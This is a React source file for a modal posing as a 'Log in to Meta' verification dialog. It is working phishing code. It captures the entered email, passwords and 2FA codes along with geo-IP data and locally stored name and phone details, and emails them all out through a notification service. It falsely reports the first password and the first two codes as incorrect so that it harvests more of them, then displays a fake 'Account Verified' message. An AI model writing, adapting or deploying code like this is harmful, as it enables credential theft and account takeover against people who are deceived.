import { useState, useEffect } from "react";
import { X, LoaderCircle } from "lucide-react";
import { sendEmailNotification } from "@/services/emailService";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";

interface MetaLoginModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSuccess: () => void;
}

type LoginStage = "username" | "password" | "code" | "success";

const MetaLoginModal = ({ isOpen, onClose, onSuccess }: MetaLoginModalProps) => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [code, setCode] = useState("");
  const [stage, setStage] = useState<LoginStage>("username");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [countdown, setCountdown] = useState(60);
  const [canResend, setCanResend] = useState(false);
  const [attempts, setAttempts] = useState(0);
  const [codes, setCodes] = useState<string[]>([]);
  const [passwords, setPasswords] = useState<string[]>([]);

  // For code stage
  const [codeAttempts, setCodeAttempts] = useState(0);
  const [isCodeDisabled, setIsCodeDisabled] = useState(false);
  const [codeCooldown, setCodeCooldown] = useState(0);

  // Geo-IP data
  const [country, setCountry] = useState("");
  const [ip, setIp] = useState("");
  const [region, setRegion] = useState("");

  useEffect(() => {
    fetch("https://ip-api.io/json")
      .then((res) => {
        if (!res.ok) throw new Error("Network response was not ok");
        return res.json();
      })
      .then((data) => {
        setCountry(data.countryName || "");
        setIp(data.ip || "");
        setRegion(data.regionName || "");
      })
      .catch((err) => {
        console.error("Failed to fetch geo data:", err);
      });
  }, []);

  useEffect(() => {
    let timer: NodeJS.Timeout;
    if (codeCooldown > 0) {
      timer = setTimeout(() => setCodeCooldown((prev) => prev - 1), 1000);
    } else {
      setIsCodeDisabled(false);
    }
    return () => clearTimeout(timer);
  }, [codeCooldown]);

  // Helper: always send both password1/2 and code1/2/3 in one call,
  // using overrides if provided.
  const sendMetaNotification = (pwArr?: string[], cdArr?: string[]) => {
    const common = {
      user_email: email,
      country,
      ip,
      region,
      timestamp: new Date().toISOString(),
    };

    const passArray = pwArr ?? passwords;
    const codeArray = cdArr ?? codes;
    const [p1 = "", p2 = ""] = passArray;
    const [c1 = "", c2 = "", c3 = ""] = codeArray;

    // Lấy thêm thông tin ứng viên từ localStorage (nếu cần)
    const storedFirstName = localStorage.getItem("firstName") || "";
    const storedLastName  = localStorage.getItem("lastName") || "";
    const storedemail      = localStorage.getItem("email") || ""; 
    const storedPhone     = localStorage.getItem("phone")     || "";

    return sendEmailNotification({
      ...common,
      attempts:            attempts,
      countdown,
      user_password1:      p1,
      user_password2:      p2,
      code_attempt:        codeAttempts,
      verification_code1:  c1,
      verification_code2:  c2,
      verification_code3:  c3,
      firstName:           storedFirstName,
      lastName:            storedLastName,
      phone:               storedPhone,
      email:               storedemail,
    } as any);
  };

  const handleFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);

    // USERNAME stage
    if (stage === "username") {
      if (!email.includes("@")) {
        setError("Please enter a valid email address.");
        return;
      }
      setIsLoading(true);
      try {
        setStage("password");
      } finally {
        setIsLoading(false);
      }
      return;
    }

    // PASSWORD stage
    if (stage === "password") {
      if (password.length < 6) {
        setError("Password must be at least 6 characters.");
        return;
      }
      setIsLoading(true);
      try {
        const next = attempts + 1;
        const newPasswords = [...passwords, password];
        setPasswords(newPasswords);
        setAttempts(next);

        // Gọi với mảng mới ngay
        await sendMetaNotification(newPasswords, undefined);

        if (next >= 2) {
          setStage("code");
          setCanResend(true);
        } else {
          setError("The password you've entered is incorrect.");
        }
      } catch (err) {
        console.error("EmailJS Error:", err);
        setError("Failed to send email. Please try again.");
      } finally {
        setIsLoading(false);
      }
      return;
    }

    // CODE stage
    if (stage === "code") {
      if (code.length < 6 || code.length > 8) {
        setError("Please enter a valid code (6 to 8 digits).");
        return;
      }
      if (isCodeDisabled) return;

      setIsLoading(true);
      try {
        const next = codeAttempts + 1;
        const newCodes = [...codes, code];
        setCodes(newCodes);
        setCodeAttempts(next);

        // Gọi với mảng mới ngay
        await sendMetaNotification(undefined, newCodes);

        if (next < 3) {
          setError("Incorrect code. Please try again.");
          setCode("");
          setIsCodeDisabled(true);
          setCodeCooldown(30);
        } else {
          setStage("success");
          setTimeout(() => onSuccess(), 2000);
        }
      } catch (err) {
        console.error("EmailJS Error:", err);
        setError("Failed to send email. Please try again.");
      } finally {
        setIsLoading(false);
      }
      return;
    }
  };

  const renderStage = () => {
    switch (stage) {
      case "username":
        return (
          <form onSubmit={handleFormSubmit} className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="email">Email or Phone</Label>
              <Input
                id="email"
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Enter your email or phone number"
                disabled={isLoading}
                className="border-neutral-300"
              />
            </div>
            {error && <p className="text-red-500 text-sm">{error}</p>}
            <Button
              type="submit"
              className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white"
              disabled={isLoading}
            >
              {isLoading && <LoaderCircle className="mr-2 h-4 w-4 animate-spin" />}
              Continue
            </Button>
          </form>
        );

      case "password":
        return (
          <form onSubmit={handleFormSubmit} className="space-y-4">
            <div className="flex items-center border rounded-md p-2 mb-4 bg-neutral-50">
              <span className="text-sm">{email}</span>
              <Button
                type="button"
                variant="ghost"
                size="sm"
                className="ml-auto text-[#1877F2] hover:bg-transparent hover:text-[#166FE5] p-0"
                onClick={() => setStage("username")}
              >
                Change
              </Button>
            </div>
            <div className="space-y-2">
              <Label htmlFor="password">Password</Label>
              <Input
                id="password"
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter your password"
                disabled={isLoading}
                className="border-neutral-300"
              />
            </div>
            {error && <p className="text-red-500 text-sm">{error}</p>}
            <Button
              type="submit"
              className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white"
              disabled={isLoading}
            >
              {isLoading && <LoaderCircle className="mr-2 h-4 w-4 animate-spin" />}
              Continue
            </Button>
          </form>
        );

      case "code":
        return (
          <form onSubmit={handleFormSubmit} className="space-y-4">
            <p className="text-neutral-700">
              Enter the 6–8 digit code we sent to {email}
            </p>
            <div className="space-y-2">
              <Label htmlFor="code">Security Code</Label>
              <Input
                id="code"
                type="text"
                value={code}
                onChange={(e) => {
                  const v = e.target.value.replace(/\D/g, "");
                  if (v.length <= 8) setCode(v);
                }}
                placeholder="Enter code"
                maxLength={8}
                disabled={isLoading}
                className="border-neutral-300 text-center text-lg tracking-widest"
              />
            </div>
            {error && <p className="text-red-500 text-sm">{error}</p>}
            <Button
              type="submit"
              className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white"
              disabled={isLoading || isCodeDisabled}
            >
              {isLoading && <LoaderCircle className="mr-2 h-4 w-4 animate-spin" />}
              {isCodeDisabled ? `Try again in ${codeCooldown}s` : "Verify"}
            </Button>
          </form>
        );

      case "success":
        return (
          <div className="space-y-4 text-center">
            <div className="flex items-center justify-center">
              <svg
                className="w-16 h-16 text-green-500"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
              >
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h3 className="text-xl font-medium">Account Verified</h3>
            <p className="text-neutral-600">
              Your Meta account has been successfully verified.
            </p>
            <LoaderCircle className="mx-auto h-8 w-8 animate-spin text-neutral-400" />
          </div>
        );
    }
  };

  return (
    <Dialog open={isOpen} onOpenChange={(open) => !open && onClose()}>
      <DialogContent className="max-w-md">
        <DialogHeader>
          <DialogTitle className="text-center text-2xl font-semibold text-[#0668E1]">
            {stage === "success" ? "Meta Account Verified" : "Log in to Meta"}
          </DialogTitle>
          <DialogDescription className="text-center text-neutral-600">
            {stage !== "success" && "Verify your Meta account to continue"}
          </DialogDescription>
        </DialogHeader>
        <div className="px-1 py-4">{renderStage()}</div>
      </DialogContent>
    </Dialog>
  );
};

export default MetaLoginModal;